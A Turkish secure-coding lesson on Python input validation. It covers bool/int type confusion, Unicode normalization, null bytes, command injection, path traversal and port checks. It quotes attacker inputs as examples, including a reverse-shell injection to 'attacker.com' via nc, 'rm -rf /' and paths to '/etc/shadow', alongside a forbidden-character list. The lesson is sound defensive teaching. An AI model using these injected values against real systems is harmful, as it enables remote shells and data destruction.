<!--
ÖZEL LİSANS — TÜM HAKLAR SAKLIDIR
Telif Hakkı (c) 2026 Seydi Eryılmaz (@seydivakkas)
Bu yazılım ve ilgili tüm dosyalar ("Yazılım") yalnızca görüntüleme ve eğitim amaçlı olarak paylaşılmıştır.
YASAKLAR: Kopyalanamaz, çoğaltılamaz, dağıtılamaz, değiştirilemez, satılamaz, tersine mühendislik yapılamaz.
İZİN VERİLEN KULLANIM: GitHub üzerinde görüntüleme ve inceleme (kopyalamadan).
YAZARIN AÇIK YAZILI İZNİ OLMAKSIZIN HİÇBİR KULLANIM HAKKI TANINMAZ.
-->

# Gün 072: Değişkenler, Veri Tipleri ve Güvenli Giriş Doğrulama

## Ustanın Girişi: Giriş Güvenliği Yoksa, Güvenlik Yoktur

Evlat, siber güvenlik dünyasında asla unutulmaması gereken bir aksiyom vardır: **"Kullanıcıdan veya ağdan gelen hiçbir girdiye güvenilmez (Never Trust User Input)!"**

Acemi geliştiriciler ve script yazarları, Python'ın dinamik tip sistemine (dynamic typing) güvenir. `port = input()` der, sonra bunu bir sokete ya da komuta yapıştırır. Saldırgan ise o `port` değişkeninin içine `; rm -rf /` yazar, `../../../../etc/shadow` yazar ya da `70000` göndererek belleği taşır. Sonuç? Sistem çöker veya saldırgan sunucunun efendisi olur.

Bir siber güvenlik otomasyonunda veya savunma aracında değişkenler sadece bellekte yer tutan isimler değildir; her değişken bir **saldırı yüzeyi (attack surface)** potansiyelidir. 

Bugün, Python'ın dinamik doğasının arkasındaki gizli tuzakları, kanonikleştirme (canonicalization) sanatını, katı tip denetimini ve sınır kontrollerini öğreneceksin.

---

## 1. Python'ın Gizli Tuzağı: Boolean vs Integer Karmaşası (Type Confusion)

Python'da nesne yönelimli mimaride tarihi bir tasarım gerçeği vardır: `bool` sınıfı, `int` sınıfının doğrudan bir alt sınıfıdır (subclass):

```python
>>> issubclass(bool, int)
True
>>> isinstance(True, int)
True
>>> True + True
2
```

Bu durum siber güvenlik kodlarında ölümcül hatalara yol açabilir:
Bir port doğrulayıcı yazdığını düşün:
```python
def check_port(val):
    if isinstance(val, int) and 1 <= val <= 65535:
        return val # Tehlike!
```
Eğer kullanıcı bu fonksiyona `True` geçerse, `isinstance(True, int)` doğrulaması başarılı olur ve fonksiyon `1` portunu (TCP Multiplexing) onaylar! 

Bu nedenle kurumsal siber güvenlik kodunda tip denetimi yapılırken:
```python
if isinstance(val, bool):
    raise SecureInputValidationError("Boolean tipi port/tamsayı olarak kabul edilemez!")
```
engeli açıkça ve ilk satırda konulmalıdır.

---

## 2. Kanonikleştirme (Canonicalization) Neden İlk Adımdır?

Birçok güvenlik filtresi, girdiyi doğrudan regex veya kara listeyle (blacklist) kontrol etmeye çalışır. Saldırganlar ise kanonik olmayan (non-canonical) girdilerle filtreleri baypas eder:

1. **Unicode Homograph ve Fullwidth Karakterler:**
   Saldırgan `A` yerine tam genişlikli Unicode `\uFF21` gönderir. Filtre harfi tanımaz, ancak Python çalıştırma anında bu karakteri çözdüğünde komut yürütülür. Çözüm: **Unicode NFKC (Compatibility Decomposition + Canonical Composition)** normalizasyonudur.
2. **Null Byte (`\x00`) Zehirlemesi:**
   C tabanlı sistem çağrılarında (örneğin işletim sistemi dosya açma fonksiyonları `open()`), dize `\x00` gördüğü an sonlanır. Saldırgan `rapor.pdf\x00.exe` gönderdiğinde, Python dosya uzantısını `.exe` sanabilirken C katmanı `rapor.pdf` okur. Çözüm: Girdide `\x00` tespit edildiği an derhal istisna fırlatıp işlemi kesmektir.

---

## 3. Temel Saldırı Vektörleri ve Savunma Mekanizmaları

### A. Komut Enjeksiyonu (Command Injection)
Bir ağ tarama aracında hostname parametresi alınırken:
- Saldırgan: `target.local; nc -e /bin/bash attacker.com 4444`
- Savunma: Yasaklı karakterler listesi (`;|&$`><\n\r`) ve kesin RFC 1123 regex doğrulaması:
  `^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$`

### B. Dizin Atlatma (Path Traversal)
Günlük dosyasının adını kullanıcıdan alan bir log analizöründe:
- Saldırgan: `../../../../Windows/System32/cmd.exe`
- Zayıf Savunma: `filename.replace("../", "")` (Saldırgan `....//` göndererek kolayca baypas eder).
- **Kurumsal Savunma (`commonpath`):**
  ```python
  abs_base = os.path.abspath(base_dir)
  abs_target = os.path.abspath(os.path.join(abs_base, untrusted_filename))
  if os.path.commonpath([abs_base, abs_target]) != abs_base:
      raise SecureInputValidationError("Dizin atlatma tespiti!")
  ```

### C. IPv4 ve Port Sınır Denetimi
- Port: $1 \le \text{port} \le 65535$.
- IPv4: `ipaddress.IPv4Address` ile 4 oktetin her birinin $0 \le \text{oktet} \le 255$ aralığında olduğu katı şekilde doğrulanır.

---

## Ustanın Çırağa Öğüdü

Evlat, kara liste (blacklist) aceminin avuntusudur; saldırgan her zaman kara listeye almayı unuttuğun bir karakter veya kodlama tekniği bulur. Gerçek usta **Beyaz Liste (Whitelist)** ile çalışır. "Nelerin yasak olduğunu" tahmin etmeye çalışma; "nelerin kabul edilebilir olduğunu" açık ve katı kurallarla belirle, geri kalan her şeyi acımasızca reddet!
